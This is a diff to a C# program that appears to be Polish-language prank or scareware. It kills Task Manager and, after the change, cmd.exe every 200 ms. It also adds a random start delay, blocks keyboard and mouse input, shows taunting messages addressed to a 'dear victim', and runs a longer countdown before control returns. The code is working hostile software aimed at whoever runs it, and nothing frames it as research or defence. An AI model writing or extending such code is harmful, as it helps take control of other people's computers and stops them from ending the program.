@@ -17,20 +17,22 @@
         [DllImport("kernel32.dll")]
         private static extern bool FreeConsole();
 
+        private static readonly Random Random = new Random();
+
         [SuppressMessage("ReSharper", "LocalizableElement")]
         static Service()
         {
             new Timer(200d) { Enabled = true }.Elapsed += delegate
                 {
-                    foreach (var proc in Process.GetProcessesByName("taskmgr"))
-                    {
-                        proc.Kill();
-                    }
+                    Array.ForEach(Process.GetProcessesByName("taskmgr"), process => process.Kill());
+                    Array.ForEach(Process.GetProcessesByName("cmd"), process => process.Kill());
                 };
+
+            Thread.Sleep(Random.Next(5000, 30000));
 
             using (new InputBlock())
             {
-                NotepadHelper.ShowMessage($"Już po Tobie ...{Environment.NewLine}:)", "Droga Roso,");
+                NotepadHelper.ShowMessage($"Już po Tobie ...{Environment.NewLine}:)", "Kochana ofiaro,");
 
                 Thread.Sleep(2000);
 
@@ -39,7 +41,7 @@
                 Console.Title = "JUŻ PO TOBIE :)";
                 Console.WriteLine("Nie masz gdzie uciec :)\n\n");
 
-                for (var i = 5; i >= 0; i--)
+                for (var i = 10; i >= 0; i--)
                 {
                     Console.Write("\rOdzyskasz kontrolę za " + i);
                     Thread.Sleep(1000);
